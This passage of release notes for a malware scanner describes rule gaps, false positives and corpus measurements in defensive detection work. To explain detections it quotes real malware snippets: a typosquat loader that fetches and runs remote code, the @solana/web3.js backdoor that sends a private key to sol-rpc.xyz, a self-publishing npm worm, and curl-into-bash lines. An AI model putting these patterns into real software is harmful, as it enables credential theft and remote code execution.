JavaScript is actually written -- matched none of them.

The control it was found by is worth keeping: twenty-two real published npm
packages (lodash, express, react, webpack, typescript, sharp, node-gyp among
them), pulled from the registry and scanned. Two produce a blocking finding and
both are correct -- `bcrypt` and `esbuild` genuinely do run a postinstall that
downloads a binary, which is the accepted-risk class `SUSPECT.INSTALL.SCRIPT.001`
exists to state.

### The gap that was general

The npm work said the JavaScript packs were missing acts the Python packs
already named. That is a description of one symptom. The general form is worse,
and the project had already written the test for it:

    def test_every_capability_primitive_is_covered_per_language(self) -> None:
        """A language that defines only some primitives inherits only some
        composite rules, which is a coverage gap that is invisible at runtime."""

**That test was already failing on `main`.** CI installs `.[dev]`, which
declares `hypothesis>=6.100`, and runs `pytest -q` with nothing excluded, so the
gate has been running and red. What hid it was local: `hypothesis` was not
installed in the working environment, so every suite run in this release
excluded `tests/unit/test_rules.py` for an import error, and `cordon rules test`
does not cover it either. The gate was not switched off. It was reporting, and
the report was not being read.

Run against the tree as it stood: **35 language/primitive gaps across sixteen
languages.** Only Python was complete. **Twenty-one of them predate this
release** -- `decompress` and `deserialize`, missing across fourteen languages at
`ae4aa41`, the commit dated 0.2.0. The other fourteen are this release's own
doing: adding `reconnaissance` as a primitive opened a hole in every language
that did not get a rule for it in the same change, which is precisely the
failure the invariant exists to catch.

| primitive | languages missing it |
|---|---|
| `reconnaissance` | cmake, csharp, go, groovy, java, kotlin, makefile, php, powershell, ruby, rust, scala, shell, xml |
| `deserialize` | cmake, csharp, go, groovy, javascript, makefile, powershell, rust, shell, typescript, xml |
| `decompress` | groovy, java, javascript, kotlin, makefile, powershell, scala, shell, typescript, xml |

Every one is a silent hole. A shell install script that reads `hostname` and
curls it out could not match the beacon composite, because `shell` had no
reconnaissance rule. A Node payload that gunzips and evals could not match a
decode chain, because `javascript` had no decompress rule. Nothing failed;
nothing fired.

Eighteen rules close all thirty-five: `CAP.SH.RECON.001`, `CAP.PS.RECON.001`,
`CAP.GO.RECON.001`, `CAP.JVM.RECON.001`, `CAP.RB.RECON.001`, `CAP.PHP.RECON.001`,
`CAP.CS.RECON.001`, `CAP.RS.RECON.001`, `CAP.BUILD.RECON.001`, and the
decompress and deserialize rules beside them -- `Import-Clixml` and
`BinaryFormatter` for PowerShell and C#, `gob.NewDecoder` for Go,
`v8.deserialize` and `node-serialize` for Node, `GZIPInputStream` for the JVM,
`bincode::deserialize` and `XMLDecoder` for the build languages. The gap map is
now **zero**.

Checked against real code in the languages the rules were written for, because
eighteen new rules across eight languages is exactly where noise comes from:
fourteen source files from Kubernetes, Rails, Elasticsearch, Kafka, Laravel,
Symfony, Cargo, ripgrep, dotnet, PowerShell, and the install scripts of `nvm`,
`oh-my-zsh` and Docker -- all of which read hostnames and fetch things for a
living. **None produces a blocking finding.**

The lesson is not the eighteen rules. It is that the project had written the
invariant, stated the failure in a sentence, wired it into CI -- and shipped a
release tagged while it was red, because the local runs that anyone actually
watched could not import the test. A gate nobody reads is not a gate. The only
thing that found the consequence was scanning real malware.

### `Function.constructor` is `Function`

A family of typosquats published through 2026 -- `chai-smart-assert`,
`chai-chain-test`, `chai-as-validated`, `chain-async-test`, `cookie-parseflow`,
`cookie-parsers-env` -- carries the same three lines, in a file like
`src/utils/swap.js` beside real vendored library code:

    const s = (await axios.get(src, { headers: { [k]: v } })).data.config;
    const handler = new Function.constructor("require", s);
    handler(require);

Fetch code from a URL, compile it, hand it `require`. Cordon reported **nothing
at all** in any of them, and it took two fixes to say why.

`new Function.constructor(a, b)` is `new Function(a, b)`. Every function's
constructor is the `Function` constructor, so the two compile and run
identically -- and the execute primitive matched `new\s+Function\s*\(`, which
the `.constructor` in the middle defeats. No execution was observed, so the
`axios.get` beside it had nothing to combine with.

Fixing that alone was not enough, and the reason is the most carefully argued
comment in the pack. `SUSPECT.DROPPER.001` requires a **third** signal past
egress and execute, because that pair on its own describes every deploy script
ever written -- vLLM's CI produced thirteen CRITICAL findings of that shape
earlier in this release. The three it accepts are a decode, an install hook, or
`fetch_exec`, the primitive that says *the thing executed is the thing
fetched*. These packages have none of the first two: the URL is in plain text,
so nothing decodes, and the payload runs on `require`, not on install.

So `CAP.JS.FETCH_EXEC.001` now reads the `await` form as well as the `.then`
form it already knew. Two hundred characters between the fetch and the
evaluator: room for those two lines and not much else.

All six packages now report `SUSPECT.DROPPER.001` at HIGH. The benign corpus is
unchanged, and so are ten real cryptography libraries -- `ethers`,
`bitcoinjs-lib`, `web3`, `node-forge`, `jsonwebtoken`, `tweetnacl`, `bip39`,
`eth-crypto`, `@noble/curves` and a clean `@solana/web3.js` -- which is the
control that matters for a rule about fetching and running code.

### Two long arrays bought a worm a ceiling

`budi-kue16-riris` is a registry-spam worm and it is not subtle: generate a
name from two word lists, rewrite `package.json`, `exec('npm publish --access
public')`, repeat. Cordon found it. It reported it at **MEDIUM**, under the
gate, because of this:

    const indonesianNames = ["andi", "budi", "cindy", ... ];
    const indonesianFoods = ["rendang", "sate", "nasiuduk", ... ];

Two very long lines in a `.js` file, and `_is_minified` asked only whether the
longest line was long and whether the extension was one a bundler writes. Both
true, so the whole file was "minified output" and inherited the ceiling meant
for vendored bundles. About thirty packages of that family are in the npm
corpus. Every one of them was below the line for the same two arrays.

A minifier deletes newlines -- that is its entire purpose -- so its output is
one line, or three, and the mean line length is most of the file. Source
somebody typed averages nearer forty bytes a line however long its longest line
happens to be. `_is_minified` now asks that too.

**This is the second time this release that this particular ceiling was found
holding real malware, and the fifth limit of any kind.** Three of the five are
ceilings -- `_is_minified` twice and the generated-artefact ceiling under
`@aifabrix/miso-client`. The other two are not: one is a reading, the pattern
tier's `marshal.loads`, and one is the per-file budget, which does not lower a
finding but removes it. The first fix required a
bundler extension alongside the long line; this one requires the long lines to
be what the file is mostly made of. Both were found the same way, by scanning
real malware rather than by reading the code.

### What the six fixes cost in noise: nothing

Two hundred repositories of the corpus, rescanned against the same
repositories in the fifth pass:

| | pass 5 | after the six fixes |
|---|---|---|
| clean | 154 (77.0%) | **156 (78.0%)** |
| blocking findings | 127 | **122** |

**Four repositories improved and none got worse.** `mesonbuild/meson` loses two
`SUSPECT.POLYGLOT.MISMATCH.001`, `catboost/catboost` a `SUSPECT.DECODE_EXEC.001`,
and `appwrite/appwrite` and `ethibox/awesome-stacks` a
`SECRET.URL.CREDENTIAL.001` each.

That is the result the changes were shaped to get, and it is the one worth
being suspicious of, so it is worth saying which fixes could plausibly have gone
the other way and did not. Widening the execute primitive to
`Function.constructor`, and `CAP.JS.FETCH_EXEC.001` to the `await` form, both
make `SUSPECT.DROPPER.001` easier to satisfy; it fires on eight repositories
here, the same eight as before. Requiring long lines to *dominate* a file
removes a ceiling from every source file with one long data literal in it,
which is the change most likely to produce new findings, and it produced none.
Bounding a proximity window in bytes pulls the other way and removes findings,
which is where two of the four improvements come from.

The measurement was run on a tree nobody was editing, with nothing else on the
machine. The per-file budget is wall-clock, so a loaded machine measures
different results -- an earlier attempt at this comparison was discarded for
exactly that reason, along with a second copy of the harness that was writing
into the same report file.

### A rule that was written, measured, and withdrawn

`@solana/web3.js` 1.95.7, published 2024-12-03, is in this corpus. Cordon finds
nothing in it. This is what it contains:

    static addToQueue(process) {
      const b = bs58.encode(process);
      fetch("https://sol-rpc.xyz/api/rpc/queue", { method: "POST", headers: {
        "x-amz-cf-id":  b.substring(0, 24).split("").reverse().join(""),
        "x-session-id": b.substring(32),
        "x-amz-cf-pop": b.substring(24, 32).split("").reverse().join("")
      }}).catch(() => {});
    }

called from `Loader.addToQueue(this._secretKey)` and four other sites: the
private key, base58-encoded, cut into three request headers shaped like
CloudFront's, two of them reversed, every error swallowed. `credential` meant an
environment variable or a credential file, and a private key held in a variable
is neither.

A rule was written for it -- `CAP.JS.KEYMATERIAL.001` naming a value called
`secretKey`, `privateKey` or a recovery phrase, and
`MALWARE.EXFIL.WALLET_KEY.001` pairing it with egress inside five lines. It
passed its tests, it survived ten real cryptography libraries as a control, and
**it has been removed again.** Three measurements, all pointing the same way:

- It fired on **none of the 999 real malicious npm packages.** Not one.
- It never caught `@solana/web3.js`, the attack it was written for. The key read
  and the `fetch` are in different functions hundreds of lines apart, which is
  dataflow and not proximity.
- The sixth corpus pass found it reporting **CRITICAL against a TypeScript
  interface in `microsoft/vscode`**, and against a Clerk API client in `lobehub`
  that sends a Clerk secret key to `api.clerk.com` in an `Authorization` header,
  which is what an API key is for. Two in the first 290 repositories.

Zero real detections against a projected ten critical false positives across the
corpus is not a rule that needs narrowing. The ten-library control passed it
because ten libraries are not 290 repositories, and the synthetic test passed it
because the test was written by the same hand as the rule. What found it was
scanning everything.

The gap it was aimed at stays open and stays written down. Detecting that
backdoor needs dataflow between two functions; this is a pattern engine, and
saying so is more useful than shipping a rule that says nothing.

Two engine fixes found underneath it are kept, because both are real and neither
depends on the rule:

**A signature laid out one parameter to a line.** `_is_declaration` reads the
rest of the line after the opening parenthesis, so a declaration whose
parentheses open at the end of it was invisible:

    fetch(
        url: string,
        secretKey: string,

`exec(` written that way was never suppressed either -- the Tailwind case the
existing comment cites happens to fit on one line. It now looks up to three
lines ahead for a typed parameter.

### The sixth pass, in full

1,427 repositories against the merged tree, compared like-for-like against the
fifth pass on the same 1,427.

| | clean | blocking findings |
|---|---|---|
| pass 5 | 1,074 (75.3%) | 1,185 |
| pass 6, corrected | **1,078 (75.5%)** | **1,184** |
| pass 6, corrected, excluding one web-shell collection | 1,078 | **1,134** (pass 5: 1,156) |

**Nineteen repositories improved and eight got worse, and five of the eight are
correct.** That distinction is the whole result, so each of the eight is named.

**`tennc/webshell` went from 29 blocking findings to 50**, and it is a
collection of real web shells. Every finding in it that had been held at MEDIUM
is now at HIGH or CRITICAL, and none remains below the line:

| | pass 5 | pass 6 |
|---|---|---|
| `SUSPECT.DECODE_EXEC.001` | 15 high + **12 medium** | **27 high**, none medium |
| `SUSPECT.DECODE_CHAIN.001` | 3 critical + **5 medium** | **8 critical**, none medium |
| `SUSPECT.DROPPER.001` | 10 high + **3 medium** | **13 high**, none medium |
| `SUSPECT.PERSIST.001` | **1 medium** | **1 high**, none medium |

Twenty-one real web shells were under the gate, and the thing holding them there
was `_is_minified`: a web shell is one long line of obfuscated PHP, which the
old test read as build output. This is the same defect that was found holding
the Shai-Hulud payload in the npm corpus, confirmed a second time on an
unrelated body of real malware.

**`processing/p5.js` went from clean to one finding**, on this:

    async function urlToStrandsCallback(url) {
      const src = await fetch(url).then(res => res.text());
      return new Function(src);
    }

Fetch a URL and compile its text into a function. That is exactly what
`SUSPECT.DROPPER.001` is named for, in a library with millions of downloads, and
it is the `await` form of `CAP.JS.FETCH_EXEC.001` -- added this release for a
family of npm typosquats -- finding the same shape in production code.

**`diegosouzapw/OmniRoute`** decodes base64 JavaScript from `duck.ai` and runs it
through `vm.runInContext`, which the file's own comment calls a supply-chain
surface. **`mudler/LocalAI`**'s Makefile pipes `curl -sfL
https://goreleaser.com/static/run` into `bash`. **`sqlmap`** keeps
`OOB_EXFIL_ENDPOINT = "https://webhook.site"` 175 lines from
`"/root/.ssh/id_rsa"`. All three were at MEDIUM in the fifth pass because
`_is_minified` had no extension test then, so a `.py` file with one long line
was build output. All three describe what is actually in the file.

**Three are false positives, and they are recorded rather than fixed.**
`Unitech/pm2` reports its own `pm2 publish` command; `Devolutions/UniGetUI`
reports a cryptominer in a package-manager catalogue that indexes mining
software; `vimagick/dockerfiles` reports one inside Snort's `community.rules`,
which is another analyser's rule material. Each is a single repository, each was
already blocking, and none changes a clean result. A suppression added on one
instance is how `_is_minified` came to be holding twenty-one web shells below
the gate, and that is too recent a lesson to spend.

**Two were false positives and were fixed**, because both changed whether a
repository was clean and both had a second instance behind them:
`microsoft/monaco-editor` and `jupyterlab/jupyterlab`. Both are above.

The policy variants, unchanged in shape from the fifth pass:

| | repositories clean |
|---|---|
| as reported | 1,078 (75.5%) |
| if unpinned fetch-and-execute did not block | 1,176 (82.4%) |
| if infrastructure and CI posture did not block | 1,141 (80.0%) |
| neither | 1,261 (88.4%) |

### What the sixth pass found that the controls did not

The sixth corpus pass runs against 1,427 repositories rather than the 200 used
to clear the work above. In its first 514 it found four things, three of them
defects in changes that had already passed every control this project has.

**A rule withdrawn.** `MALWARE.EXFIL.WALLET_KEY.001` reported CRITICAL against
a TypeScript interface in `microsoft/vscode`, a Clerk API client in `lobehub`,
`Mintplex-Labs/anything-llm` and `stablyai/orca` -- four in 514 repositories,
against zero detections in 999 real malicious npm packages. Removed. See above.

**A bridge that reached into a callback.** `CAP.JS.FETCH_EXEC.001` was widened
to read the `await` form, and the widened pattern matched this, in
`microsoft/monaco-editor`'s AMD loader:

    fetch(i)
      .then((o) => { ... return o.text(); })
      .then((o) => { ... self.eval(...) })

A module loader fetching a module and evaluating it, which is what a module
loader is. It gave `SUSPECT.DROPPER.001` its third signal and turned a clean
repository into a HIGH. The bridge now refuses to cross a brace: the evaluator
has to follow the fetch in straight-line code, and the callback form is what the
older, tighter `.then` pattern was always for.

**Two findings that are correct and were being hidden.**
`diegosouzapw/OmniRoute` decodes base64 JavaScript from `duck.ai` and runs it
through `vm.runInContext`; the file says so itself, in a comment calling it a
supply-chain surface. It was suppressed because `challenge.ts` has a
1,230-character line -- and a mean line length of 70, which is why the
`_is_minified` fix above reports it now. `mudler/LocalAI`'s Makefile pipes
`curl -sfL https://goreleaser.com/static/run` into `bash`, which is the shape
`SUSPECT.DROPPER.001` is named for, and the build-tooling ceiling is written to
stand aside exactly there.

**Two false positives recorded rather than tuned away.** `sqlmap` reports
`SUSPECT.EXFIL.DROP_POINT.001` on `"/root/.ssh/id_rsa"` inside its table of
well-known local-file-inclusion targets, which is reference data in a security
tool. `Unitech/pm2` reports `SUSPECT.REGISTRY.SELF_PUBLISH.001` on
`sexec('npm publish', ...)` in `lib/API/Modules/NPM.js`, which is pm2's
documented module-publishing feature. Neither rule existed when the fifth pass
ran, so neither is a regression; pm2 was already blocking on two other findings,
so it does not move the clean rate. Against the 82 real malicious packages
`SELF_PUBLISH` catches, one pm2 is a trade worth naming rather than a rule worth
bending.

The pattern is the point. Three times in one day the full corpus caught
something that a synthetic test, a ten-library control and a 200-repository
subset had all passed. A control is only as wide as the code in it.

### Proximity is a line count, and a minifier deletes lines

Testing the rule above against ten real cryptography libraries produced one
CRITICAL: `ethers`, the most used Ethereum library there is, twice, in
`dist/ethers.min.js` and `dist/ethers.umd.min.js`.

Both hits are on line 1, because the whole library is line 1. Every composite
with a `proximity` degenerates to file scope on a bundle, so a rule written to
say *this file does both things in the same breath* quietly becomes *this file
does both things*. And a MALICIOUS composite is deliberately exempt from the
minified ceiling -- malware is not excused for being generated output -- so
nothing downstream would have caught it.

A window must now be short in bytes as well as in lines: two hundred bytes per
line of declared proximity, which is generous for source whose real mean is
nearer forty, and far too short to span a bundle. This applies to every
composite in the pack, not only the new one.

The rule found a false positive in the library it was written to protect, before
that rule was committed. That is what the ten-library control is for.

### A composite that one observation could satisfy

`SUSPECT.REGISTRY.SELF_PUBLISH.001` asked for two things:

    all:
      - rule: CAP.JS.PUBLISH.001
      - capability: spawn

The publish rule's own capability **is** `spawn`. The second term asked nothing
the first had not already answered, so one hit satisfied both -- and with
`proximity: 200` it could satisfy them from anywhere in the file.

The evaluator cannot see this. It matches terms against a set of capabilities
and a set of fired rule ids; there is no point at which one hit is spent on one
term. So the rule read as a conjunction of two independent observations, was one
observation written twice, and nothing at runtime could tell.

`ruvnet/ruflo` paid for it. Two of its files keep a list of commands to warn a
user about -- `RISKY_COMMANDS`, `mediumRisk` -- and `'npm publish'` is in each.
Both came out as a registry-spam worm at HIGH. The finding was reported in a
linter, about the linter's own list of things it warns you not to do.

The primitive now asks that the command be passed or bound rather than named.
`exec('npm publish')` runs it, `cmd = 'npm publish'` is about to, and `['npm
publish', 'git push']` is a list -- an array element follows a bracket or a
comma, never an equals or an open paren. `=` as well as `(` because malware does
assign first, and a rule that read only the inline form would trade two false
positives for a whole shape.

`test_no_composite_is_satisfied_by_a_single_hit` makes it unwriteable: any `all`
whose named rule carries a capability another term asks for now fails at the
rule level, where it is visible. It flagged this rule and no other.

### A release script is not release tooling in every language

`apache/superset` keeps `release-if-necessary.js` in its embedded SDK. It reads
the current version, asks the registry whether that version exists, and
publishes if the answer is 404. That is the project's own release tooling, and
the ceiling for it already existed -- `publish-*` matches any extension, and so
does `release.*`. But `release-*` and `deploy-*` were spelled `.sh` only.

So `release.js` was the project's own tooling and `release-if-necessary.js` was
not, on an asymmetry in a path list. Named extensions rather than a wildcard,
because widening a ceiling by name is how a payload called `release-notes.bin`
would inherit an excuse it has not earned.

### The limit that chose what not to read

`bun_environment.js` is ten megabytes of obfuscated JavaScript. It is the
payload the Shai-Hulud worm shipped through npm in November 2025, beside a
`preinstall` hook in several hundred compromised packages, and it is in this
corpus several hundred times.

Cordon blocked those packages. It blocked them on
`SUSPECT.INSTALL.SCRIPT.001` -- *this package has a preinstall script* -- which
is the same finding `bcrypt` gets, and `esbuild`, and every package that
compiles something at install time. The evidence that would have told them
apart never arrived:

    scan coverage  1 note(s) about the scan itself
      bun_environment.js  This file exceeded its 5s budget, so the remaining
      detectors did not run on it. Results for this file are partial.

The per-file budget is checked between detectors and keeps whatever has already
run. So the order of that list decides what a large file gets analysed **for**,
and the order was alphabetical -- chosen, the comment said, so that "load order
is reproducible across machines and Python versions". Reproducible is not the
same as sensible. `capability` sorts fourth, ahead of `obfuscation` and
`secrets`, and on a ten-megabyte file it spent the entire budget on its own
regex sweep. Every detector after it was dropped. The one that would have said
*this is the output of an obfuscator* was one of them.

That is a limit an attacker controls. Make the payload big enough and it selects
which checks run, by name, in the alphabet.

Three changes, and the file now scans **completely inside the same five-second
budget**:

- **Detectors run cheapest first.** Magic bytes and manifests, then the bounded
  scans, then the two full sweeps. A budget should cut the most expensive work,
  not whatever sorts last.
- **The packer scan stops when it has its answer.** It asked `findall` for every
  match in the file to compare the count against a minimum of two, then walked
  the file again with `finditer` to find the first one in real code. An
  obfuscated file is the worst case for that: every identifier matches, so ten
  megabytes produced hundreds of thousands of matches, twice.
- **`is_commented` is memoised per line.** It scans a line to find where a
  comment starts, and the answer does not depend on which column is asked
  about -- but every match on the line paid for its own scan. On a file that is
  one line, that is the whole file every time: twenty-two million `startswith`
  calls, about nine seconds of the five-second budget.

What cordon now says about that package:

    package.json         HIGH    The 'preinstall' script runs automatically
    bun_environment.js   HIGH    This file matches the output shape of obfuscator.io
    bun_environment.js   MEDIUM  Line 1 is 10157586 characters of high-entropy text

The first line is the one `bcrypt` gets. The second and third are not.

This is the fourth time in this release that a limit meant for noise was found
holding real malware below the line, after `_is_minified`, the generated-artefact
ceiling under `@aifabrix/miso-client`, and the pattern-tier reading that
`marshal.loads` silenced. The first three were ceilings, which lower a finding.
This one is a budget, which removes it -- and unlike a ceiling it leaves a note
saying so, which nothing was reading.

### Known, not fixed in this release

- **A typed declaration hides its value from the assignment rule.** `const
  SECRET_KEY: &str = "..."` in Rust, and the same shape in any language that
  writes the type between the name and the `=`, is not matched: the pattern reads
  a name, an `=` and a value, and a type annotation sits where it does not expect
  one. Matching `name: Type = value` instead means matching every typed
  declaration in Python, TypeScript, Rust, Kotlin and Swift, which is most lines
  of most files in those languages. It needs its own measured pass rather than a
  guess, and a provider-prefixed value in that position is still caught by the
  provider's own pattern, which consults none of this.

- **A dotted key never matches the assignment rule.** `spring.datasource.password=`
  in an `application.properties`, and every other config format where the key is a
  dotted path, is missed: the pattern refuses to start a name after a `.` so that
  `obj.token` reads as a member access rather than an assignment, and in a properties
  file the dots are the key. Found while writing a control for the translation fix
  above, which is the right way round -- a control that passes on nothing is worth
  more as a discovery than as a test.

  Not fixed here because it is a MISS rather than noise, and the fix points the other
  way: admitting dotted names would report every dotted config key whose last word is
  a credential word, which is a measured pass of its own and not a change to make in
  the same release as sixty false-positive removals. A credential with a provider
  prefix in that position is still caught by the provider's pattern.

- **A private key under `src/main/resources` is probably a demo key, and the tool
  does not say so.** Nine findings across two repositories -- eight of them one
  tutorial project -- sit in a JVM module's resources directory, where a committed
  key is compiled into the jar and shipped to every user, which is an argument that
  it cannot be secret and an argument that the leak is worse. Both readings are
  defensible and two repositories is not a measurement, so the predicate was not
  widened on the strength of it.

- **`getattr` on an unknown namespace reaching a function is still reported when
  the call site is a different statement.** The AST tier now asks whether a
  reflective read is invoked, and it answers that question within one expression.
  `f = getattr(os, pick())` followed by `f()` two lines later is two statements and
  is reported, which is the safe direction and not a claim about the code.

- **A dependency-version table reached by `__import__` still reads as dynamic
  dispatch.** `saltstack/salt`'s `salt/version.py` prints the version of every
  library it depends on: a module-level list of `(label, module, attribute)`
  literal tuples, looped over with `imp = __import__(imp)` and
  `getattr(imp, attr)`. The values are all written in the file, so the
  enumerated-literals guard is the right answer in principle -- but reaching them
  means following a module-level name that is also `append`ed to, which is the one
  thing that guard's docstring refuses to do, and for a stated reason: the next
  name to follow would be a list built from a network response. Two findings in
  one repository did not buy that.

  The install-time context is not the error. `setup.py` imports the module for its
  `__version__`, so `_hook_import_closure` is right that it executes; what it
  cannot know is that the dispatch sits in a generator `setup.py` never calls, and
  static reachability inside an imported module is a call-graph problem rather
  than a predicate.

- **The composites allow 200 lines between capabilities and the true positives
  need five.** `proximity: 200` is what says two capabilities are one act. Measured
  against the malicious corpus, every one of the eleven samples that carries both a
  credential read and an egress call has them within **five** lines -- median one,
  and four of them on the same line. The false positives are at 24 lines
  (`saltstack/salt`) and 114 (`vllm-project/vllm`, where the two acts are in
  different functions). A 40x margin is not a threshold doing work.

  Not narrowed here. The corpus is eleven synthetic samples written compactly, the
  number would want to differ per composite, and it is a pack-wide change to
  thresholds that gate every `MALWARE.*` rule -- which is a measured pass of its
  own, not a change to land beside it.

- **Thirty-one of fifty-four provider patterns have an open-ended body, and a
  floor below the vendor's real length is how a placeholder becomes a critical.**
  GitHub's was fixed above because its formats are documented and fixed. The rest
  were not swept, deliberately: several are open-ended because the vendor does not
  document a fixed length -- JWTs, Slack tokens, Atlassian and Dropbox tokens are
  genuinely variable -- and tightening the others from memory rather than from
  each vendor's documentation is how a real token stops being detected. The right
  shape for that work is a pass with the formats in hand, one rule at a time,
  which is not this release.

- **A file with no uncommented content is a template, and the tool reads it as
  code.** `saltstack/salt` ships `conf/cloud.providers` and
  `conf/cloud.providers.d/tencent.conf`, where every non-blank line is commented
  out and the values are the examples the documentation shows -- two
  high-severity Tencent findings. The comment test is applied to the generic
  assignment rule and deliberately not to the provider patterns, for a reason
  that still holds: a token prefix followed by its full length is a token
  wherever it sits, including on a line somebody commented out instead of
  rotating. What would separate this case is the whole file rather than the
  line -- a file with nothing uncommented in it cannot be the copy that runs --
  and that is a new predicate rather than an extension of an existing one.

- **A Homebrew formula's `test do` block is test material and does not look
  like it.** `Formula/g/gitleaks.rb` writes a fabricated 36-character GitHub
  token into a file so that `brew test gitleaks` has something to find. The
  value is correctly shaped, so no length or alphabet check reaches it; the
  signal is the enclosing block, and neither `names_test_file` nor
  `names_test_directory` fires on `Formula/g/gitleaks.rb`. One finding in one
  repository, and the predicate it needs -- a Ruby DSL block whose name means
  "this is the test" -- is worth having only if the class is bigger than this
  sample shows.

- **Decoding a signing certificate is the same shape as a dropper.**
  `open-ani/animeko` base64-decodes an Apple `.p12` from an environment variable
  in its Gradle build logic, writes it to a temporary file and imports it into a
  keychain, and that is `SUSPECT.DECODE_CHAIN.001` at critical plus
  `SUSPECT.DROPPER.001` and `SUSPECT.DECODE_EXEC.001` on the same line. Decode,
  then write, then run a tool is what iOS signing in CI looks like and also what
  a dropper looks like; what separates them is that the decoded bytes are
  imported rather than executed, and the tool cannot see which of the two the
  `security` command does.

- **A Google API key in a client cannot be told from a billable server key.**
  Eighteen findings across seventeen repositories, and the argument for
  dismissing them is strong in the general case: an `AIza` key is Google's
  *client* key format, restricted by referrer, IP, Android signing certificate or
  iOS bundle id rather than kept secret, which is why `google-services.json`,
  `GoogleService-Info.plist` and `AndroidManifest.xml` are already excused by
  name. The sampled findings are mostly a vendor's own key re-embedded in an
  alternative client: NewPipe, Metrolist, ytdlnis and LibreTube share one key in
  their `PoTokenWebView`, and GoogleChrome/lighthouse, `jessfraz/dockerfiles`'
  Chromium build and `YiiGuxing/TranslationPlugin` each carry one of Google's.

  It was not fixed, for two measured reasons. The values are not concentrated
  enough for the published-credential list to help -- fifteen distinct keys across
  eighteen findings, only one of them shared -- and the file-name predicate cannot
  reach them, because they sit in `.kt`, `.cs`, `.cpp`, `.js`, `.rs`, `.go`,
  `Dockerfile`, `.html`, `.json`, `.xml` and `.yml`, which is everything. What
  would be needed is a way to tell a public client key from a server key with
  billing attached, and the two are written identically. The consequence of
  getting that wrong in the other direction is somebody's cloud bill, so the
  finding stays.

- **A tool reading the credential file of the service it is talking to.** What
  remains of the credential-store findings after `.netrc`: `zeroclaw`'s Bedrock
  provider reads `~/.aws/config` and calls AWS, `sqlmap`'s `pypi.sh` checks
  `~/.pypirc` and publishes to PyPI, `coolify`'s upgrade script checks
  `/root/.docker/config.json` and pulls images, `getsentry/sentry` reads gcloud's
  application default credentials and calls a Google API. The rule's own message
  asks the right question -- "confirm this component is the one that owns the
  store" -- and it is answerable: pair the store with the egress destination,
  `.aws` with `amazonaws.com`, `.npmrc` with the npm registry, `.pypirc` with
  PyPI. That is a new predicate over two capabilities at once rather than a
  narrowing of an existing one, and it wants its own pass.

- **A quoted word is still a path component.** The browser-store patterns require
  a path separator or an opening quote before `Cookies` and `Login Data`, and the
  quote is there because the malicious corpus sample builds the path the way
  Python does, out of quoted components with no slashes in them. `xtekky/gpt4free`
  writes `help="Cookies/HAR directory"` in an argument parser, which is a quote
  followed by the word. One finding, and closing it means giving up the corpus
  sample or telling a CLI help string from a path expression.

- **Base64 is the storage format of the field being read.** Five of the
  decode-and-execute findings are a program decoding something whose format is
  base64 by specification: `kubernetes-client/python` decodes
  `idp-certificate-authority-data` out of a kubeconfig, `ViktorUJ/cks` runs
  `kubectl get secret -o jsonpath='{.data.token}' | base64 -d` because that is
  how a Kubernetes secret is read, `dagster` decodes an ECR authorization token
  into `user:pass` because that is what `GetAuthorizationToken` returns,
  `netdata` hex-decodes `/etc/machine-id`, and `open-ani/animeko` base64-decodes
  an Apple `.p12`. The signal is available -- the name of the thing being
  decoded says it is stored encoded -- but it is a new predicate over the
  decode's argument rather than a narrowing of an existing one, and five
  findings did not buy it in this release.

- **Some findings are true and will not go away.** A lockfile whose top-level
  entries carry no integrity hash is genuinely unverified; `curl https://sh.rustup.rs
  | sh` in a Dockerfile genuinely runs whatever that host serves at build time;
  `privileged: true` genuinely grants the host. Those are reported, and the answer
  for a project that needs them is a baseline entry with a justification rather
  than a quieter rule. The distinction this pass was drawing is between a finding
  a project can act on and a finding a project can only suppress.

### Package intelligence

- `intel/data/` ships an allowlist of **50,090 established package names** across
  seven ecosystems, generated from the registries by
  `scripts/refresh_package_intel.py`: PyPI's own download export, npm's search API,
  crates.io, NuGet, Packagist, RubyGems and pub.dev. Plain text, one name a line,
  so adding a name is a line a reviewer can object to.

  It is deliberately **not** every published name. Registries contain the squats,
  so allowlisting everything that exists would switch the rule off while looking
  like an improvement. Two filters decide: a per-ecosystem download threshold, and
  a refusal of any name that is a transposition, doubled character or ASCII
  homoglyph of a far more popular name in the same fetch. That second filter caught
  `tdqm` against `tqdm` and `cfg-iif` against `cfg-if` -- both real squats. What it
  refuses is written to `<ecosystem>.refused.txt` beside the allowlist, because an
  exclusion nobody can see is the failure mode of every suppression mechanism ever
  shipped.

  The refresh never runs during a scan. Maven, Gradle, Go and CocoaPods publish no
  popularity signal to rank by and keep the curated in-code sets; they are named in
  the script rather than quietly absent.

### Measured

**1,427 public repositories, five complete passes over the same corpus.**

| pass | what it measured | repositories clean | blocking findings |
|---|---|---|---|
| 1 | before any of this | 749 (52.5%) | 6,333 |
| 2 | the first fourteen fixes | 829 (58.1%) | 3,959 |
| 3 | sampling rounds one to four | 982 (68.8%) | 1,807 |
| 4 | sampling rounds five to eighteen | 1,071 (75.1%) | 1,275 |
| 5 | sampling rounds nineteen to twenty-eight | 1,074 (75.3%) | 1,185 |
| 6 | the ecosystem work, and the six fixes below | **1,078 (75.5%)** | **1,184** |

Findings fell by 81 per cent and the clean share rose by 23.0 points.

The sixth pass is reported **corrected**: it ran against a tree containing
`MALWARE.EXFIL.WALLET_KEY.001`, which was withdrawn while the pass was running,
so its five repositories are subtracted. As measured it reads 1,075 clean and
1,195 findings. Both numbers are here because one of them is of a tree that will
not ship.

The fifth pass is the one that measured the correctness fixes rather than the
volume ones, and it is the smallest step: seventeen repositories improved and
five got worse, against ninety in the fourth pass. Each of the five was traced.
`home-assistant/core` is upstream's own commit -- a `curl | bash` added to
`Dockerfile.dev` between the two clones, which is a true finding about a file
that changed. The other four are the round-twenty-one correction working:
`local`, `default` and `dev` in a filename no longer grade a production file as
test material, so `apache/superset`'s `Dockerfile.from_local_tarball`,
`juspay/hyperswitch`'s `scripts/create_default_user.sh`,
`omacom/omarchy`'s `bin/omarchy-install-dev-env` and
`mozilla-mobile/firefox-ios`'s `use_local_as.sh` report what their siblings
always did. **No rule fires more often than it did in the fourth pass for any
other reason.**

Rounds twenty-nine to thirty-three and the detection work are not in any of
these five passes. What they are worth is measured separately, above and below. On the 1,427
repositories both of the last two passes cover, the classes worked hardest fell
furthest: credential assignments 192 to 83 on a 520-repository sample, private keys
37 to 14, install scripts 16 to 2, anti-analysis 15 to 4.

Nothing was added. Every sampling round ran the malicious corpus, and
`TestMaliciousCorpus` asserts each of its samples still reports at its required
floor.

**What the remaining 1,275 are.** Two families account for most of it, and both are
policy rather than accuracy:

| | repositories clean (fifth pass) |
|---|---|
| as reported | 1,074 (75.3%) |
